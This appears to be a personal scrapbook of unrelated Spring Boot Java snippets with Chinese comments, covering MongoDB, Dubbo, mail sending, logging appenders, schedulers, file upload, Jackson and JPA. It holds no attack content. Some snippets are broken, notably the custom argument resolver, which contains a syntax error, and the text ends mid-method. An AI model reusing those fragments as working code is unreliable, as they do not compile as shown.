		mongoTemplate.save(msg);
		
		return msg;
	}

	@Override
	public NotifyMsg findNotifyMsgByNo(String notifyNo) {
		//根据Criteria 改造查询条件
		Query query = new Query(Criteria.where("notifyNo").is(notifyNo));
		return mongoTemplate.findOne(query, NotifyMsg.class);
	}

	@Override
	public List<NotifyMsg> findNotifyMsgByDate(String notifyDate) {
		//查找 notifyDate 根据Criteria 改造查询条件
		Query query = new Query(Criteria.where("notifyDate").is(notifyDate));		
		return mongoTemplate.find(query, NotifyMsg.class);
	}

	@Override
	public NotifyMsg delNotifyMsgById(String id) {
		//查找 id 根据Criteria 改造查询条件
		Query query = new Query(Criteria.where("id").is(id));	
		return mongoTemplate.findAndRemove(query, NotifyMsg.class);
	}

}

import java.io.Serializable;
import java.util.Date;


import org.springframework.data.annotation.CreatedDate;
import org.springframework.data.annotation.Id;
import org.springframework.data.mongodb.core.index.Indexed;
import org.springframework.data.mongodb.core.mapping.Document;
import org.springframework.data.mongodb.core.mapping.Field;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;

/**
 * 通知消息对象
 * @author oKong
 *
 */
@Document(collection="notify_msg")
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class NotifyMsg implements Serializable{

	/**
	 * 
	 */
	private static final long serialVersionUID = -8985545025018238754L;

	@Id
	String id;
	
	/**
	 * 消息类型
	 */
	@Indexed
	String notifyType;
	
	/**
	 * 消息单号
	 */
	@Indexed
	String notifyNo;
	
	/**
	 * 消息通知日期
	 */
	String notifyDate;
	
	/**
	 * 消息体
	 */
	@Field("notifyMsg")//可指定存储时的字段名
	String notifyMsg;
	
	/**
	 * 创建时间
	 */
	@CreatedDate
	Date gmtCreate;
}

import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.mongodb.repository.MongoRepository;
import org.springframework.data.mongodb.repository.Query;

import cn.lqdev.learning.springboot.chapter31.biz.entity.NotifyMsg;

/**
 * MongoRepository 示例
 * @author oKong
 *
 */
public interface NotifyMsgDao extends MongoRepository<NotifyMsg, String>{

	/*
	 * 根据消息号进行查询
	 */
	NotifyMsg findByNotifyNo(String notifyNo);
	
	/**
	 * 根据日期查询 自定义查询
	 * @author 作者：oKong
	 */
	//需要注意 查询的语法结构 ，同时这里和`jpa`不一样的地方是，第一个索引值从0 开始。。
	@Query("{'notifyDate':?0}")
	Page<NotifyMsg> queryBySql(String notifyDate,Pageable pageable);
}
--------------------------------------------------------------------------------------------------------
import com.alibaba.dubbo.config.annotation.Service;

import cn.lqdev.learning.springboot.dubbo.api.IHelloService;
import lombok.extern.slf4j.Slf4j;

/**
 * 定义一个服务实现类
 * @author oKong
 *
 */
// 这里注意 此类@service是dubbo的
@Service(
		version = "${demo.service.version}", //版本
		application = "${dubbo.application.id}", //应用ID
		protocol = "${dubbo.protocol.id}", //协议id
		registry = "${dubbo.registry.id}")//注册中心id
@Slf4j
public class HelloServiceImpl implements IHelloService {
	
	@Override
	public String hello(String name) {
		log.info("dubbo提供者，参数name:{}", name);
		return "hello " + name + ",this is a dubbo provider!";
	}

}
--------------------------------------------------------------------------------------------------------
# 邮件相关
# SMTP服务器地址
spring.mail.host=smtp.qq.com
# SMTP服务器端口号 默认-1
# spring.mail.port=-1
# 发送方帐号
spring.mail.username=邮箱
# 发送方密码（授权码）
spring.mail.password=邮箱密码
#javaMailProperties 配置
# 开启用户身份验证
spring.mail.properties.mail.smtp.auth=true
# STARTTLS：一种通信协议，具体可以搜索下
#spring.mail.properties.mail.smtp.starttls.enable=true
#spring.mail.properties.mail.smtp.starttls.required=true

# 缓存配置 开发阶段应该配置为false 因为经常会改
spring.freemarker.cache=false
# 模版后缀名 默认为ftl
spring.freemarker.suffix=.ftl
# 文件编码
spring.freemarker.charset=UTF-8
# 模版加载的目录
spring.freemarker.template-loader-path=classpath:/templates/
--------------------------------------------------------------------------------------------------------
import java.io.File;
import java.util.HashMap;
import java.util.Map;

import javax.mail.MessagingException;
import javax.mail.internet.MimeMessage;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.mail.javamail.MimeMessageHelper;
import org.springframework.ui.freemarker.FreeMarkerTemplateUtils;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

/**
 * 发送邮件
 * @author oKong
 *
 */
@RestController
public class EmailController {
	
	@Autowired
	private JavaMailSender mailSender;
	
	/**
	 * 纯文本格式
	 * @return
	 */
	@GetMapping("/simple")
	public String simpleSend() {
		SimpleMailMessage message = new SimpleMailMessage();
		message.setFrom("499452441@qq.com");
		message.setTo("499452441@qq.com");
		message.setSubject("主题：来自oKong邮件");
		message.setText("公众号：一枚趔趄的猿(lqdevOps)，作者：oKong");
		mailSender.send(message);		
		return "发送成功!";
	}
	
	@GetMapping("/attach")
	public String attachSend() throws MessagingException {
		MimeMessage mimeMessage = mailSender.createMimeMessage();

		MimeMessageHelper helper = new MimeMessageHelper(mimeMessage, true);
		helper.setFrom("499452441@qq.com");
		helper.setTo("499452441@qq.com");	
		helper.setSubject("主题：来自oKong邮件(带附件)");
		helper.setText("(含附件)公众号：一枚趔趄的猿(lqdevOps)，作者：oKong");
		//添加附件
		File qrCode = new File("wxgzh8cm.jpg");
		//建议文件带上后缀，可支持在线预览 
		helper.addAttachment("公众号二维码.jpg", qrCode);
		mailSender.send(mimeMessage);
		return "附件邮件发送成功!";
	}
	
	/**
	 * html格式
	 * @return
	 * @throws MessagingException
	 */
	@GetMapping("/html")
	public String htmlSend() throws MessagingException {
		MimeMessage mimeMessage = mailSender.createMimeMessage();

		MimeMessageHelper helper = new MimeMessageHelper(mimeMessage, true);
		helper.setFrom("499452441@qq.com");
		helper.setTo("499452441@qq.com");	
		helper.setSubject("主题：来自oKong邮件(带附件)");
		helper.setText("<html><body><div>(含附件)公众号：一枚趔趄的猿(lqdevOps)，作者：oKong</div><div><img src='cid:winxin'></div></body></html>",true);
		
		//抄送人
//		helper.setCc("");
		//密送人
//		helper.setBcc("");
		//添加附件
		File qrCode = new File("wxgzh8cm.jpg");
		//建议文件带上后缀，可支持在线预览 
		helper.addAttachment("公众号二维码.jpg", qrCode);
		helper.addInline("winxin", qrCode);

		mailSender.send(mimeMessage);
		return "附件邮件发送成功!";
	}
	
	@GetMapping("/template")
	public String template(String userName) throws Exception {
		MimeMessage mimeMessage = mailSender.createMimeMessage();

		MimeMessageHelper helper = new MimeMessageHelper(mimeMessage, true);
		helper.setFrom("499452441@qq.com");
		helper.setTo("499452441@qq.com");	
		helper.setSubject("主题：" + userName + ",你有一封来自oKong邮件(From模版)");
		Map<String, Object> model = new HashMap<String, Object>();
		model.put("userName", StringUtils.isEmpty(userName) ? "oKong" : userName);
		String templateString = FreeMarkerTemplateUtils.processTemplateIntoString(freemarkerConfig.getTemplate("mail.ftl"), model);
		helper.setText(templateString,true);
		//抄送人
//		helper.setCc("");
		//密送人
//		helper.setBcc("");
		//添加附件
		File qrCode = new File("wxgzh8cm.jpg");
		//建议文件带上后缀，可支持在线预览 
		helper.addAttachment("公众号二维码.jpg", qrCode);
		helper.addInline("winxin", qrCode);
		mailSender.send(mimeMessage);
		
		return "模版文件发送成功!";
	}
	//自动注入
	@Autowired 
	freemarker.template.Configuration freemarkerConfig;

}
--------------------------------------------------------------------------------------------------------
logging.register-shutdown-hook=true

import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.core.Layout;
import ch.qos.logback.core.UnsynchronizedAppenderBase;
import lombok.Getter;
import lombok.Setter;

@Getter
@Setter
public class MyLogbackAppender extends UnsynchronizedAppenderBase<ILoggingEvent>{

    Layout<ILoggingEvent> layout;
    
    //自定义配置 
	String printString;

	
    
	@Override
    public void start(){
		//这里可以做些初始化判断 比如layout不能为null ,
		if(layout == null) {
			addWarn("Layout was not defined");
		}
		//或者写入数据库 或者redis时 初始化连接等等
		 super.start();
		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {

			@Override
			public void run() {
				// 执行资源释放操作

			}
		}));		 
    }
	

    @Override
    public void stop()
    {
       //释放相关资源，如数据库连接，redis线程池等等
    	System.out.println("logback-stop方法被调用");
    	if(!isStarted()) {
    		return;
    	}
        super.stop();
    }
	
	@Override
	public void append(ILoggingEvent event) {
		if (event == null || !isStarted()){
            return;
        }
	         // 此处自定义实现输出			 
			 // 获取输出值：event.getFormattedMessage()
			 // System.out.print(event.getFormattedMessage());
			 // 格式化输出		
		System.out.print(printString + "：" + layout.doLayout(event));
	      
	}
}

import java.io.Serializable;

import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.Layout;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.appender.AbstractAppender;
import org.apache.logging.log4j.core.config.plugins.Plugin;
import org.apache.logging.log4j.core.config.plugins.PluginAttribute;
import org.apache.logging.log4j.core.config.plugins.PluginElement;
import org.apache.logging.log4j.core.config.plugins.PluginFactory;
import org.apache.logging.log4j.core.layout.PatternLayout;

/**
 * 自定义log4j2输出源，简单的输出到控制台
 * @author oKong
 *
 */
//这里的 MyLog4j2 对应就是 xml中，
/**
 * 
 *  <appenders>
 *     <MyLog4j2 name="customAppender" printString="一枚趔趄的猿">
 *     </MyLog4j2>
 *  </appenders>
 *
 */
@Plugin(name = "MyLog4j2", category = "Core", elementType = "appender", printObject = true)
public class MyLog4j2Appender extends AbstractAppender {

	String printString;
   /**  
	 *构造函数 可自定义参数 这里直接传入一个常量并输出
	 * 
	*/ 
	protected MyLog4j2Appender(String name, Filter filter, Layout<? extends Serializable> layout,String printString) {
		super(name, filter, layout);
		this.printString = printString;
	}

	@Override
	public void append(LogEvent event) {
		 if (event != null && event.getMessage() != null) {
	         // 此处自定义实现输出			 
			 // 获取输出值：event.getMessage().toString()
			 // System.out.print(event.getMessage().toString());
			 // 格式化输出
			 System.out.print(printString + "：" + getLayout().toSerializable(event));
	      }
		
	}
	
	/**  接收配置文件中的参数 
	 * 
	 * @PluginAttribute 字面意思都知道，是xml节点的attribute值，如<oKong name="oKong"></oKong> 这里的name 就是 attribute
	 * @PluginElement：表示xml子节点的元素，
	 * 如
	 *     <oKong name="oKong">
	 *         <PatternLayout pattern="[%d{HH:mm:ss:SSS}] [%p] - %l - %m%n"/>
	 *     </oKong>
	 *   其中，PatternLayout就是 的 Layout，其实就是{@link Layout}的实现类。
	 */ 
	@PluginFactory
	public static MyLog4j2Appender createAppender(
			@PluginAttribute("name") String name,
            @PluginElement("Filter") final Filter filter, 
            @PluginElement("Layout") Layout<? extends Serializable> layout,
            @PluginAttribute("printString") String printString) {
		if (name == null) {
            LOGGER.error("no name defined in conf."); 
            return null; 
        } 
		//默认使用 PatternLayout
        if (layout == null) { 
            layout = PatternLayout.createDefaultLayout(); 
        } 
        
        return new MyLog4j2Appender(name, filter, layout, printString);
	}
	
	@Override
	public void start() {
		System.out.println("log4j2-start方法被调用");
		super.start();
	}
	
	@Override
	public void stop() {
		System.out.println("log4j2-stop方法被调用");
		super.stop();
	}
}
--------------------------------------------------------------------------------------------------------
	@Autowired
	ScheduledTask task;

	@GetMapping("/timer")
	public String doTimer() {
		Timer timer = new Timer();
		timer.schedule(new TimerTask() {
			
			@Override
			public void run() {
				log.info("Timer定时任务执行：" + new Date());
				
			}
		}, 1000,1000);//延迟1秒启动，每1秒执行一次
		log.info("Timer定时任务启动：" + new Date());
		return "timer";
	}
	@GetMapping("/executor")
	public String ScheduledExecutorService() {
		//
		ScheduledExecutorService service = Executors.newScheduledThreadPool(10);
		service.scheduleAtFixedRate(new Runnable() {
			
			@Override
			public void run() {
				log.info("ScheduledExecutorService定时任务一执行：" + new Date());				
			}
		}, 1, 2, TimeUnit.SECONDS);//首次延迟1秒，之后每1秒执行一次
		log.info("ScheduledExecutorService定时任务启动：" + new Date());	
		
		service.scheduleAtFixedRate(new Runnable() {
			
			@Override
			public void run() {
				log.info("ScheduledExecutorService定时任务二执行：" + new Date());			
				
			}
		}, 0, 1, TimeUnit.SECONDS);
		
		return "ScheduledExecutorService!";		
	}
	
	@Autowired
	TaskScheduler taskScheduler;
	
	@GetMapping("/poolTask")
	public String threadPoolTaskScheduler() {
	
		taskScheduler.schedule(new Runnable() {
			
			@Override
			public void run() {
				log.info("ThreadPoolTaskScheduler定时任务：" + new Date());
			}
		}, new CronTrigger("0/3 * * * * ?"));//每3秒执行一次
		return "ThreadPoolTaskScheduler!";
	}
	
--------------------------------------------------------------------------------------------------------
    @RequestMapping(value = "/files/{file_name:.+}", method = RequestMethod.GET)
    public void getFile(@PathVariable("file_name") String fileName, @RequestHeader String referer, HttpServletResponse response) {
        if (referer == null || referer.isEmpty())
            throw new RefererException("Missing header 'referer' when try download file: " + fileName);
 
//...
    }
--------------------------------------------------------------------------------------------------------
spring init --name=file-demo --dependencies=web file-demo

        // Try to determine file's content type
        String contentType = null;
        try {
            contentType = request.getServletContext().getMimeType(resource.getFile().getAbsolutePath());
        } catch (IOException ex) {
            logger.info("Could not determine file type.");
        }
		
    @PostMapping("/")
    public String handleFileUpload(@RequestParam("file") MultipartFile file,
            RedirectAttributes redirectAttributes) {

        storageService.store(file);
        redirectAttributes.addFlashAttribute("message",
                "You successfully uploaded " + file.getOriginalFilename() + "!");

        return "redirect:/";
    }
	
   @Bean
    CommandLineRunner init(StorageService storageService) {
        return (args) -> {
            storageService.deleteAll();
            storageService.init();
        };
    }
--------------------------------------------------------------------------------------------------------
import java.nio.file.Paths;
import java.util.stream.Stream;

import org.hamcrest.Matchers;
import org.junit.Test;
import org.junit.runner.RunWith;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;

import static org.mockito.BDDMockito.given;
import static org.mockito.BDDMockito.then;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.fileUpload;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.model;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import hello.storage.StorageFileNotFoundException;
import hello.storage.StorageService;

@RunWith(SpringRunner.class)
@AutoConfigureMockMvc
@SpringBootTest
public class FileUploadTests {

    @Autowired
    private MockMvc mvc;

    @MockBean
    private StorageService storageService;

    @Test
    public void shouldListAllFiles() throws Exception {
        given(this.storageService.loadAll())
                .willReturn(Stream.of(Paths.get("first.txt"), Paths.get("second.txt")));

        this.mvc.perform(get("/")).andExpect(status().isOk())
                .andExpect(model().attribute("files",
                        Matchers.contains("http://localhost/files/first.txt",
                                "http://localhost/files/second.txt")));
    }

    @Test
    public void shouldSaveUploadedFile() throws Exception {
        MockMultipartFile multipartFile = new MockMultipartFile("file", "test.txt",
                "text/plain", "Spring Framework".getBytes());
        this.mvc.perform(fileUpload("/").file(multipartFile))
                .andExpect(status().isFound())
                .andExpect(header().string("Location", "/"));

        then(this.storageService).should().store(multipartFile);
    }

    @SuppressWarnings("unchecked")
    @Test
    public void should404WhenMissingFile() throws Exception {
        given(this.storageService.loadAsResource("test.txt"))
                .willThrow(StorageFileNotFoundException.class);

        this.mvc.perform(get("/files/test.txt")).andExpect(status().isNotFound());
    }

}

https://www.baeldung.com/spring-file-upload
--------------------------------------------------------------------------------------------------------
curl -i \
-H "Accept: application/json" \
-H "Content-Type:application/json" \
-X POST --data 
  '{"username": "johnny", "password": "password"}' "https://localhost:8080/.../request"
--------------------------------------------------------------------------------------------------------
@Configuration
public class TestBeanPostProcessor implements BeanPostProcessor {

    @Override
    public Object postProcessBeforeInitialization(Object o, String s) throws BeansException {
        return o;
    }

    @Override
    public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {
        if (beanName.equalsIgnoreCase("requestMappingHandlerAdapter")) {
            RequestMappingHandlerAdapter requestMappingHandlerAdapter = (RequestMappingHandlerAdapter) bean;
            List<HandlerMethodArgumentResolver> argumentResolvers = requestMappingHandlerAdapter.getArgumentResolvers();
            List<HandlerMethodArgumentResolver> modifiedArgumentResolvers = new ArrayList<>(argumentResolvers.size());                
            for(int i =1; i< argumentResolvers.size();i++){
                modifiedArgumentResolvers.add(argumentResolvers.get(i));
            }
            modifiedArgumentResolvers.add(new TestRequestBodyMethodProcessor(requestMappingHandlerAdapter.getMessageConverters(), new ArrayList<Object>()));
            ((RequestMappingHandlerAdapter) bean).setArgumentResolvers(null);
            ((RequestMappingHandlerAdapter) bean).setArgumentResolvers(modifiedArgumentResolvers);
        }
        return bean;
    }
}

public class TestRequestBodyMethodProcessor extends AbstractMessageConverterMethodProcessor {

    public TestRequestBodyMethodProcessor(List<HttpMessageConverter<?>> converters) {
        super(converters);
    }

    public TestRequestBodyMethodProcessor(List<HttpMessageConverter<?>> converters, ContentNegotiationManager manager) {
        super(converters, manager);
    }

    public TestRequestBodyMethodProcessor(List<HttpMessageConverter<?>> converters, List<Object> requestResponseBodyAdvice) {
        super(converters, null, requestResponseBodyAdvice);
    }

    public TestRequestBodyMethodProcessor(List<HttpMessageConverter<?>> converters,
                                          ContentNegotiationManager manager, List<Object> requestResponseBodyAdvice) {
        super(converters, manager, requestResponseBodyAdvice);
    }

    @Override
    public boolean supportsParameter(MethodParameter parameter) {
        return parameter.hasParameterAnnotation(RequestBody.class);
    }

    @Override
    public boolean supportsReturnType(MethodParameter returnType) {
        return (AnnotatedElementUtils.hasAnnotation(returnType.getContainingClass(), ResponseBody.class) ||
                returnType.hasMethodAnnotation(ResponseBody.class));
    }

    @Override
    public Object resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer,
                                  NativeWebRequest webRequest, WebDataBinderFactory binderFactory) throws Exception {

        parameter = parameter.nestedIfOptional();
        BaseInsert trans_type_code = ;
        Object arg = readWithMessageConverters(webRequest, parameter,
                Test.getModelClassObject().getClass());
        String name = Conventions.getVariableNameForParameter(parameter);

        WebDataBinder binder = binderFactory.createBinder(webRequest, arg, name);
        if (arg != null) {
            validateIfApplicable(binder, parameter);
            if (binder.getBindingResult().hasErrors() && isBindExceptionRequired(binder, parameter)) {
                throw new MethodArgumentNotValidException(parameter, binder.getBindingResult());
            }
        }
        mavContainer.addAttribute(BindingResult.MODEL_KEY_PREFIX + name, binder.getBindingResult());

        return adaptArgumentIfNecessary(arg, parameter);
    }

    @Override
    protected <T> Object readWithMessageConverters(NativeWebRequest webRequest, MethodParameter parameter,
                                                   Type paramType) throws IOException, HttpMediaTypeNotSupportedException, HttpMessageNotReadableException {

        HttpServletRequest servletRequest = webRequest.getNativeRequest(HttpServletRequest.class);
        ServletServerHttpRequest inputMessage = new ServletServerHttpRequest(servletRequest);
        Object arg = readWithMessageConverters(inputMessage, parameter, paramType);
        if (arg == null) {
            if (checkRequired(parameter)) {
                throw new HttpMessageNotReadableException("Required request body is missing: " +
                        parameter.getMethod().toGenericString());
            }
        }
        return arg;
    }

    protected boolean checkRequired(MethodParameter parameter) {
        return (parameter.getParameterAnnotation(RequestBody.class).required() && !parameter.isOptional());
    }

    @Override
    public void handleReturnValue(Object returnValue, MethodParameter returnType,
                                  ModelAndViewContainer mavContainer, NativeWebRequest webRequest)
            throws IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException {

        mavContainer.setRequestHandled(true);
        ServletServerHttpRequest inputMessage = createInputMessage(webRequest);
        ServletServerHttpResponse outputMessage = createOutputMessage(webRequest);
        // Try even with null return value. ResponseBodyAdvice could get involved.
        writeWithMessageConverters(returnValue, returnType, inputMessage, outputMessage);
    }
}
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.TreeNode;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.JsonDeserializer;
import com.fasterxml.jackson.databind.JsonSerializer;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.node.TextNode;
import javafx.scene.paint.Color;
import org.springframework.boot.jackson.JsonComponent;

import java.io.IOException;

@JsonComponent
public class UserCombinedSerializer {
    public static class UserJsonSerializer extends JsonSerializer<User> {

        @Override
        public void serialize(User user, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException, JsonProcessingException {
            jsonGenerator.writeStartObject();
            jsonGenerator.writeStringField("favoriteColor", getColorAsWebColor(user.getFavoriteColor()));
            jsonGenerator.writeEndObject();
        }

        private static String getColorAsWebColor(Color color) {
            int r = (int) Math.round(color.getRed() * 255.0);
            int g = (int) Math.round(color.getGreen() * 255.0);
            int b = (int) Math.round(color.getBlue() * 255.0);
            return String.format("#%02x%02x%02x", r, g, b);
        }
    }

    public static class UserJsonDeserializer extends JsonDeserializer<User> {
        @Override
        public User deserialize(JsonParser jsonParser, DeserializationContext deserializationContext) throws IOException, JsonProcessingException {
            TreeNode treeNode = jsonParser.getCodec().readTree(jsonParser);
            TextNode favoriteColor = (TextNode) treeNode.get("favoriteColor");
            return new User(Color.web(favoriteColor.asText()));
        }
    }
}


import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.TreeNode;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.JsonDeserializer;
import com.fasterxml.jackson.databind.node.TextNode;
import javafx.scene.paint.Color;
import org.springframework.boot.jackson.JsonComponent;

import java.io.IOException;

@JsonComponent
public class UserJsonDeserializer extends JsonDeserializer<User> {
    @Override
    public User deserialize(JsonParser jsonParser, DeserializationContext deserializationContext) throws IOException, JsonProcessingException {
        TreeNode treeNode = jsonParser.getCodec().readTree(jsonParser);
        TextNode favoriteColor = (TextNode) treeNode.get("favoriteColor");
        return new User(Color.web(favoriteColor.asText()));
    }
}

import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonSerializer;
import com.fasterxml.jackson.databind.SerializerProvider;
import javafx.scene.paint.Color;
import org.springframework.boot.jackson.JsonComponent;

import java.io.IOException;

@JsonComponent
public class UserJsonSerializer extends JsonSerializer<User> {

    @Override
    public void serialize(User user, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException, JsonProcessingException {
        jsonGenerator.writeStartObject();
        jsonGenerator.writeStringField("favoriteColor", getColorAsWebColor(user.getFavoriteColor()));
        jsonGenerator.writeEndObject();
    }

    private static String getColorAsWebColor(Color color) {
        int r = (int) Math.round(color.getRed() * 255.0);
        int g = (int) Math.round(color.getGreen() * 255.0);
        int b = (int) Math.round(color.getBlue() * 255.0);
        return String.format("#%02x%02x%02x", r, g, b);
    }
}


public enum Modes {

    ALPHA, BETA;
}
--------------------------------------------------------------------------------------------------------
import org.baeldung.boot.converter.StringToEmployeeConverter;
import org.baeldung.boot.converter.StringToEnumConverterFactory;
import org.baeldung.boot.converter.GenericBigDecimalConverter;
import org.springframework.context.annotation.Configuration;
import org.springframework.format.FormatterRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebConfig implements WebMvcConfigurer {
	 
    @Override
    public void addFormatters(FormatterRegistry registry) {
        registry.addConverter(new StringToEmployeeConverter());
        registry.addConverterFactory(new StringToEnumConverterFactory());
        registry.addConverter(new GenericBigDecimalConverter());
    }
}
--------------------------------------------------------------------------------------------------------
import java.util.Properties;

import javax.persistence.EntityManagerFactory;
import javax.sql.DataSource;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.PropertySource;
import org.springframework.core.env.Environment;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
import org.springframework.transaction.annotation.EnableTransactionManagement;

@Configuration
@EnableJpaRepositories(basePackages = { "org.baeldung.boot.repository", "org.baeldung.boot.boottest", "org.baeldung.repository" })
@PropertySource("classpath:persistence-generic-entity.properties")
@EnableTransactionManagement
public class H2JpaConfig {

    @Autowired
    private Environment env;

    @Bean
    public DataSource dataSource() {
        final DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(env.getProperty("jdbc.driverClassName"));
        dataSource.setUrl(env.getProperty("jdbc.url"));
        dataSource.setUsername(env.getProperty("jdbc.user"));
        dataSource.setPassword(env.getProperty("jdbc.pass"));

        return dataSource;
    }

    @Bean
    public LocalContainerEntityManagerFactoryBean entityManagerFactory() {
        final LocalContainerEntityManagerFactoryBean em = new LocalContainerEntityManagerFactoryBean();
        em.setDataSource(dataSource());
        em.setPackagesToScan(new String[] { "org.baeldung.boot.domain", "org.baeldung.boot.model", "org.baeldung.boot.boottest", "org.baeldung.model" });
        em.setJpaVendorAdapter(new HibernateJpaVendorAdapter());
        em.setJpaProperties(additionalProperties());
        return em;
    }

    @Bean
    JpaTransactionManager transactionManager(final EntityManagerFactory entityManagerFactory) {
        final JpaTransactionManager transactionManager = new JpaTransactionManager();
        transactionManager.setEntityManagerFactory(entityManagerFactory);
        return transactionManager;
    }

    final Properties additionalProperties() {
        final Properties hibernateProperties = new Properties();

        hibernateProperties.setProperty("hibernate.hbm2ddl.auto", env.getProperty("hibernate.hbm2ddl.auto"));
        hibernateProperties.setProperty("hibernate.dialect", env.getProperty("hibernate.dialect"));
        hibernateProperties.setProperty("hibernate.show_sql", env.getProperty("hibernate.show_sql"));

        return hibernateProperties;
    }

}
--------------------------------------------------------------------------------------------------------
public interface GenericConverter<I, O> extends Function<I, O> {

    default O convert(final I input) {
        O output = null;
        if (input != null) {
            output = this.apply(input);
        }
        return output;
    }

    default List<O> convert(final List<I> input) {
        List<O> output = new ArrayList<O>();
        if (input != null) {
            output = input.stream().map(this::apply).collect(toList());
        }
        return output;
    }
}
public class AccountCreateRequestConverter implements GenericConverter<AccountCreateRequest, AccountOutput> {

    @Override
    public AccountOutput apply(AccountCreateRequest input) {
        AccountOutput output = new AccountOutput();

        output.setEmail(input.getEmail());
        output.setName(input.getName());
        output.setLastName(input.getLastName());        
        output.setPassword(input.getPassword());                                

        return output;
    }

}
--------------------------------------------------------------------------------------------------------
 @Test
  public void resolveArgumentTypeVariableWithNonGenericConverter() throws Exception {
    Method method = MyParameterizedController.class.getMethod("handleDto", Identifiable.class);
    HandlerMethod handlerMethod = new HandlerMethod(new MySimpleParameterizedController(), method);
    MethodParameter methodParam = handlerMethod.getMethodParameters()[0];

    String content = "{\"name\" : \"Jad\"}";
    this.servletRequest.setContent(content.getBytes("UTF-8"));
    this.servletRequest.setContentType(MediaType.APPLICATION_JSON_VALUE);

    List<HttpMessageConverter<?>> converters = new ArrayList<HttpMessageConverter<?>>();
    HttpMessageConverter target = new MappingJackson2HttpMessageConverter();
    HttpMessageConverter proxy =
        ProxyFactory.getProxy(HttpMessageConverter.class, new SingletonTargetSource(target));
    converters.add(proxy);
    RequestResponseBodyMethodProcessor processor =
        new RequestResponseBodyMethodProcessor(converters);

    SimpleBean result =
        (SimpleBean)
            processor.resolveArgument(methodParam, mavContainer, webRequest, binderFactory);

    assertNotNull(result);
    assertEquals("Jad", result.getName());
  }
--------------------------------------------------------------------------------------------------------
private static class ConstantNumberExpression extends NumberExpression<Integer> {
    private static final long serialVersionUID = 1220768215234001828L;

    public ConstantNumberExpression(final int constant) {
        super(new ConstantImpl<>(constant));
    }

    @Override
    @Nullable
    public <R, C> R accept(final Visitor<R, C> v, @Nullable final C context) {
        return v.visit((Constant<Integer>) mixin, context);
    }
}
--------------------------------------------------------------------------------------------------------
//get the mimetype
			String mimeType = URLConnection.guessContentTypeFromName(file.getName());
			if (mimeType == null) {
				//unknown mimetype so set the mimetype to application/octet-stream
				mimeType = "application/octet-stream";
			}
--------------------------------------------------------------------------------------------------------
setCustomArgumentResolvers

RequestMappingHandlerAdapter requestMappingHandlerAdapter

    @PostConstruct
    public void init() {
        this.adapter.setCustomArgumentResolvers(Collections.singletonList(new RequestMethodProcessor(this.objectMapper, this.modelMapper, this.validator)));
        this.adapter.setCustomReturnValueHandlers(Collections.singletonList(new ResponseMethodProcessor(this.objectMapper, this.modelMapper, this.validator)));
    }
--------------------------------------------------------------------------------------------------------
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.request.async.DeferredResult;
import org.springframework.web.context.request.async.WebAsyncTask;

import lombok.extern.slf4j.Slf4j;

/**
 * spring方式实现异步请求
 * 
 * @author oKong
 *
 */
@Slf4j
@RestController
public class SpringController {

	@RequestMapping("/callable")
	public Callable<String> callable() {
		log.info("外部线程：" + Thread.currentThread().getName());
		return new Callable<String>() {

			@Override
			public String call() throws Exception {
				log.info("内部线程：" + Thread.currentThread().getName());
				return "callable!";
			}
		};
	}
	
	@RequestMapping("/deferredresult")
	public DeferredResult<String> deferredResult(){
		log.info("外部线程：" + Thread.currentThread().getName());
		//设置超时时间
		DeferredResult<String> result = new DeferredResult<String>(60*1000L);
		//处理超时事件 采用委托机制
		result.onTimeout(new Runnable() {
			
			@Override
			public void run() {
				log.error("DeferredResult超时");
